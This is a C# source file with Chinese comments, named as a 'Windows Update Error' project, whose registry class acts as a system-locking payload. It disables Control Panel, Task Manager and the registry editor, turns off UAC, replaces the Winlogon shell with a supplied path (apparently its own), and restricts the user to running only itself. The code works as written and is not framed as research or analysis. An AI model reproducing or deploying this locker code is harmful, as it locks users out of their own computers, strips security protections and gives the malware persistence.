using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Windows_Update_Error
{
    // 这个类包含了用于操作Windows注册表的多个方法，以实现各种系统相关设置的调整功能
    internal class Regedit_Set
    {
        // 用于禁用系统设置相关功能的方法，通过在注册表中创建相应键值来实现禁用控制面板和任务管理器的功能
        public void Disable_Settings(int a = 1)
        {
            // 获取当前用户的注册表根键，后续操作将基于此根键展开
            RegistryKey key = Registry.CurrentUser;
            // 在当前用户的注册表中创建或打开用于存储资源管理器策略相关的子键，路径为 @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            RegistryKey software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            // 在上述创建或打开的子键下设置名为 "NoControlPanel" 的值，参数a的值决定了该设置的状态（默认为1，通常用于表示启用或禁用的相关设置值），以此来禁用控制面板
            software.SetValue("NoControlPanel", a);
            // 在当前用户的注册表中创建或打开用于存储系统策略相关的子键，路径为 @"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            // 在上述创建或打开的子键下设置名为 "DisableTaskMgr" 的值，参数a的值决定了该设置的状态（默认为1，通常用于表示启用或禁用的相关设置值），以此来禁用任务管理器
            software.SetValue("DisableTaskMgr", a);
            // 关闭之前打开的注册表子键，释放相关资源
            software.Close();
            // 关闭当前用户的注册表根键，释放相关资源
            key.Close();
        }

        // 用于禁用注册表编辑器的方法，通过在注册表中创建相应键值来阻止用户访问注册表编辑器
        public void Disable_Regedit(int a = 1)
        {
            // 获取当前用户的注册表根键，后续操作将基于此根键展开
            RegistryKey key = Registry.CurrentUser;
            // 在当前用户的注册表中打开或创建用于存储系统策略相关的子键（并赋予写权限），路径为 @"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            RegistryKey software = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            // 如果打开的子键为空（即不存在该子键），则创建该子键
            if (software == null)
            {
                software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            // 在上述创建或打开的子键下设置名为 "DisableRegistryTools" 的值，参数a的值决定了该设置的状态（默认为1，通常用于表示启用或禁用的相关设置值），以此来禁用注册表编辑器
            software.SetValue("DisableRegistryTools", a);
            // 关闭之前打开的注册表子键，释放相关资源
            software.Close();
            // 关闭当前用户的注册表根键，释放相关资源
            key.Close();
        }

        // 用于向与程序启动相关的文件中写入数据的方法，会创建或覆盖指定文件，并将传入的数据写入其中
        public void Start_Update(string a)
        {
            try
            {
                // 创建一个StreamWriter对象，用于向指定文件写入数据，文件名为 "Error_m1.txt"，如果文件已存在则覆盖原有内容，编码格式采用UTF8
                StreamWriter writer = new StreamWriter("Error_m1.txt", false, Encoding.UTF8);
                // 将传入的数据写入到文件中
                writer.Write(a);
                // 刷新缓冲区，确保数据真正写入到文件中
                writer.Flush();
                // 关闭StreamWriter对象，释放相关资源
                writer.Close();
            }
            catch (Exception ex)
            {
                // 如果在写入文件过程中出现异常，弹出消息框显示异常信息
                MessageBox.Show(ex.Message);
            }
        }

        // 用于从与程序启动相关的文件中读取数据的方法，会先检查文件是否存在，若存在则读取其内容，若不存在则创建文件并写入默认值后再读取
        public string Start_Detection()
        {
            // 定义要操作的文件路径，此处为 "Error_m1.txt"
            string path = "Error_m1.txt";
            // 创建一个FileInfo对象，用于检查文件是否存在
            FileInfo fileInfo = new FileInfo(path);
            // 如果文件不存在
            if (fileInfo.Exists == false)
            {
                try
                {
                    // 创建一个StreamWriter对象，用于向指定文件写入数据，文件名为 "Error_m1.txt"，覆盖原有内容（因为第二个参数为false），编码格式采用UTF8
                    StreamWriter writer = new StreamWriter(path, false, Encoding.UTF8);
                    // 向文件中写入默认值 "114514"
                    writer.Write("114514");
                    // 刷新缓冲区，确保数据真正写入到文件中
                    writer.Flush();
                    // 关闭StreamWriter对象，释放相关资源
                    writer.Close();
                }
                catch (Exception ex)
                {
                    // 如果在写入文件过程中出现异常，弹出消息框显示异常信息
                    MessageBox.Show(ex.Message);
                }
            }
            // 创建一个StreamReader对象，用于从指定文件读取数据，文件名为 "Error_m1.txt"，编码格式采用UTF8
            StreamReader sr = new StreamReader(path, Encoding.UTF8);
            // 读取文件中的全部内容
            string read = sr.ReadToEnd();
            // 关闭StreamReader对象，释放相关资源
            sr.Close();
            // 返回读取到的数据
            return read;
        }

        // 用于关闭用户账户控制（UAC）功能的方法，通过修改注册表中的相应值来实现关闭UAC的操作
        public void UAC_OFF()
        {
            // 获取本地计算机的注册表根键，后续操作将基于此根键展开
            RegistryKey key = Registry.LocalMachine;
            // 在本地计算机的注册表中打开或创建用于存储系统策略相关的子键（并赋予写权限），路径为 @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
            // 如果打开的子键为空（即不存在该子键），则创建该子键
            if (software == null)
            {
                software = key.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            // 在上述创建或打开的子键下设置名为 "EnableLUA" 的值为0，以此来关闭用户账户控制（UAC）功能
            software.SetValue("EnableLUA", 0);
            // 关闭之前打开的注册表子键，释放相关资源
            software.Close();
            // 关闭本地计算机的注册表根键，释放相关资源
            key.Close();
        }

        // 用于将程序设置为随系统启动自动运行的方法，通过修改Winlogon进程相关的注册表键值，将程序的路径设置为系统启动时的外壳（shell）程序
        public static string Local_1 = Process.GetCurrentProcess().MainModule.FileName;
        public void PC_Start(string a)
        {
            try
            {
                // 获取当前进程的路径，后续可能用于设置为系统启动项相关的路径
                // 打开本地计算机注册表中与Winlogon进程相关的子键，路径为 @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"，并赋予写权限，方便后续修改键值
                RegistryKey key = Registry.LocalMachine;
                RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                // 如果打开的子键为空（即不存在该子键），则创建该子键
                if (software == null)
                {
                    software = key.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                }
                // 在上述创建或打开的子键下设置名为 "Shell" 的值为传入的参数a所代表的路径，以此将程序设置为随系统启动自动运行
                software.SetValue("Shell", a);
                // 关闭之前打开的注册表子键，释放相关资源
                software.Close();
                // 关闭本地计算机的注册表根键，释放相关资源
                key.Close();
            }
            catch (Exception ex)
            {
                // 如果在设置过程中出现异常，弹出消息框显示异常信息
                MessageBox.Show(ex.Message);
            }
        }

        // 用于启用或禁用Windows相关功能限制的方法，根据传入的布尔值参数来决定是添加还是删除相应的注册表键值，以实现限制或解除限制的功能
        public void Disable_Windows(bool x)
        {
            // 如果传入的参数x为true，启用Windows功能限制
            if (x == true)
            {
                // 获取当前用户的注册表根键，后续操作将基于此根键展开
                RegistryKey registryKey = Registry.CurrentUser;
                // 在当前用户的注册表中创建用于存储资源管理器策略相关的子键，路径为 @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
                RegistryKey registryKey1 = registryKey.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                // 在上述创建的子键下设置名为 "RestrictRun" 的值为1，用于开启对可运行程序的限制功能
                registryKey1.SetValue("RestrictRun", 1);
                // 在当前用户的注册表中创建用于存储资源管理器策略下RestrictRun相关的子键，路径为 @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun"
                registryKey1 = registryKey.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun");
                // 在上述创建的子键下设置一个以当前进程名称为键名和值的键值对，具体作用可能与限制当前程序的运行等相关（具体需结合实际使用场景）
                registryKey1.SetValue(Process.GetCurrentProcess().ProcessName + ".exe", Process.GetCurrentProcess().ProcessName + ".exe");
                // 关闭之前打开的注册表子键，释放相关资源
                registryKey1.Close();
                // 关闭当前用户的注册表根键，释放相关资源
                registryKey.Close();
            }
            // 如果传入的参数x为false，解除Windows功能限制
            if (x == false)
            {
                // 获取当前用户的注册表根键，后续操作将基于此根键展开
                RegistryKey registryKey = Registry.CurrentUser;
                // 在当前用户的注册表中创建用于存储资源管理器策略相关的子键，路径为 @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
                RegistryKey registryKey1 = registryKey.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                // 删除名为 "RestrictRun" 的注册表键值，以此解除对可运行程序的限制功能
                registryKey1.DeleteValue("RestrictRun");
                // 关闭之前打开的注册表子键，释放相关资源
                registryKey1.Close();
                // 关闭当前用户的注册表根键，释放相关资源
                registryKey.Close();
            }
        }
    }
}